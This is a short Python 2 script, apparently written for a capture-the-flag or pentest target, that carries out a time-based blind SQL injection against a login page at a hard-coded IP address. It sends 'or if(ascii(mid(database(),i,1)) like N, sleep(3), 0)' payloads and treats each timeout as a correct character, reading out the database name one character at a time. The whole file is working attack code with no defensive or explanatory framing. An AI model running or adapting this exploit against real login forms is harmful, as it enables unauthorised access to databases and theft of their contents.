#!/bin/bash python
#!coding=utf-8
import requests

#慢速就是代表正确
#select * from mob_admin where username='admi' or if((ascii(mid(database(),1,1)) like 97),sleep(2),0);

payloads = list('1234567890qwertyuiopasdfghjklzxcvbnm{}QWERTYUIOPASDFGHJKLZXCVBNM')
url = 'http://218.2.197.238:28087/admin/include/checklogin.php'
username = ''

for i in xrange(1,39):
	for payload in payloads:
		poc = "adin\' or if((ascii(mid(database(),%s,1)) like %s),sleep(3),0)#" %(i, ord(payload))
		postpay = {'username':poc, 'password':'111', 'Submit':'Admin+Login'}
		try:
			r = requests.post(url, data=postpay, timeout=2)
		except Exception as e:
			username += payload
			print username
			break
			
#print username;
# print(u' '.join(r.text).encode('utf-8'))